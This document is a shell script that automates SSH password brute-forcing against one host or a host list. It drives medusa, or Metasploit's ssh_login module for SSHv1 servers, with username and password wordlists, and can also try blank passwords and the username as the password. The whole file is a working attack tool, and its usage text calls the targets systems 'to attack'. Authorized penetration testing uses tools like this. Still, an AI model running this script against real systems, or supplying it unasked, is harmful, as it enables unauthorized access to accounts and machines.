#!/bin/sh

ShowUsage() {
	echo ""
	echo "Usage: $0 [--sshv1] [--tryname] [--tryblank] [--hostfile=<file> | --host=<host>] [--userfile=<userfile> | --userid=<user>] <--passwordfile=<passwordfile>"
	echo ""
	echo "Required:"
	echo "--host=<host>        IP address of single system to attack"
	echo "--passwordfile=<passwordfile>  Password file to use"
	echo ""
	echo "Optional:"
	echo "--sshv1               Server is an ssh v1 server (uses metasploit)."
	echo "--tryname		    Try the username as the password."
	echo "--tryblank	    Try a blank password."
	echo "--hostfile=<file>     File with list of IP's to attack instead of a single host"
	echo "--help                Usage information."
	echo ""
	echo "One of the following is required if not using Cisco telnet:"
	echo "--userid=<user>       Single user id to try"
	echo "--userfile=<userfile> File with list of usernames to attempt"
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

HOSTFILE=""
HOST=""
PASSWORDFILE=""
USERNAME=""
USERFILE=""
SSHV1=0
TRYBLANK=0
TRYNAME=0

for i in $*
do
	case $i in
	--tryname)
		TRYNAME=1
	;;
	--tryblank)
		TRYBLANK=1
	;;
	--sshv1)
		SSHV1=1
	;;
	--host=*)
		HOST=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--hostfile=*)
		HOSTFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--passwordfile=*)
		PASSWORDFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userid=*)
		USERNAME=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userfile=*)
		USERFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--help | *)
		ShowUsage
		exit 1
	;;
	esac
done

# Sanity check...
if [ ${#HOST} -eq 0 -a ${#HOSTFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a host or a host file."
	exit 2
fi

if [ ${#USERNAME} -eq 0 -a ${#USERFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a user name or a user name file."
	exit 2
fi

if [ ${#PASSWORDFILE} -eq 0 ]; then
	echo "ERROR: Please specify a password file."
	exit 2
fi

if [ ! -e $PASSWORDFILE ]; then
	echo "ERROR: file $PASSWORDFILE could not be found."
	exit 3
fi

if [ $SSHV1 -eq 1 ]; then
	if [ ! -e /usr/bin/crack.sshv1.expect ]; then
		echo "ERROR: Unable to find required file - /usr/bin/crack.sshv1.expect"

		exit 3
	fi

	if [ ${#USERNAME} -eq 0 ]; then
		echo "SSHv1 currently only supports a single userid."
		exit 4
	fi
fi

# Okay, now we're ready to go.
if [ ${#USERFILE} -gt 0 ]; then
	USERPARAM="-U $USERFILE"
else
	USERPARAM="-u $USERNAME"
fi

# Medusa ssh
echo "Running tests..."
# -F = stop after finding combo
# -e ns = try blank and name

if [ ${#HOSTFILE} -gt 0 ]; then
	HOSTLIST=`cat $HOSTFILE | grep -v "^$" | grep -v "^#"`
else
	HOSTLIST=$HOST
fi

NUMHOSTS=`echo "$HOSTLIST" | wc -l`

CREATEDFILE=0

if [ ${#USERFILE} -eq 0 -a $SSHV1 -eq 1 ]; then
	USERFILE="host.$USERNAME.tmp"
	echo "$USERNAME" > host.$USERNAME.tmp
	CREATEDFILE=1
fi


for CURHOST in $HOSTLIST
do
	OUTPUTFILE=`echo "$CURHOST.crack.ssh.txt"`
	DATESTR=`date`

	HOSTPARAM="-h $CURHOST"

	if [ $NUMHOSTS -gt 1 ]; then
		# Parallelizing scans
		echo "[$DATESTR] Spawning ssh brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Spawning ssh brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

		if [ $SSHV1 -eq 0 ]; then
			medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M ssh -e ns -F > $OUTPUTFILE &
		else
			msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $CURHOST; set PASS_FILE $PASSWORDFILE; set THREADS 3; set USER_FILE $USERFILE; exploit; exit" > $OUTPUTFILE &
		fi
	else
		# Run single
		echo "[$DATESTR] Running ssh brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Running ssh brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE
		if [ $SSHV1 -eq 0 ]; then
			EXTRAPARMS=""
			if [ $TRYNAME -eq 1 ]; then
				EXTRAPARMS="-e s"
			fi

			if [ $TRYBLANK -eq 1 ]; then
				if [ ${#EXTRAPARMS} -eq 0 ]; then
					EXTRAPARMS="-e n"
				else
					EXTRAPARMS="-e ns"
				fi
			fi
			
			medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M ssh $EXTRAPARMS -F > $OUTPUTFILE
		else
			msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $CURHOST; set PASS_FILE $PASSWORDFILE; set THREADS 3; set USER_FILE $USERFILE; exploit; exit" > $OUTPUTFILE
		fi

		DATESTR=`date`
		echo "[$DATESTR] Scan completed.  See $OUTPUTFILE for results."
		echo "[$DATESTR] Scan completed." >> $OUTPUTFILE
	fi
done

if [ $CREATEDFILE -eq 1 ]; then
	rm $USERFILE
fi

